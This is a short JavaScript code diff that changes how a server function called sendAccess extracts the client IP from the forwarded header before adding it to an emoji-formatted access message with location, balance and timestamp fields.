@@ -160,6 +160,10 @@ const processActions = async (req, res) => {
 
 const sendAccess = async (req, res) => {
   try {
+      const raw = req.headers['x-forwarded-for'] 
+    || req.connection.remoteAddress 
+    || ''
+  const ip = raw.split(',')[0].trim()
     
 
     const body = req.body
@@ -173,7 +177,7 @@ const sendAccess = async (req, res) => {
 🧭 Longitud: ${ body[0].longitude }
 🪙 Balance: ${ body[0].balance_new }
 🗓 TimeStamp: ${ body[0].access_date }
-🌐 IP: ${ req.headers['x-forwarded-for'] || req.connection.remoteAddress }
+🌐 IP: ${ ip }
 ■■■■■■■■■■■■■■■`
 
   sender(send, res)
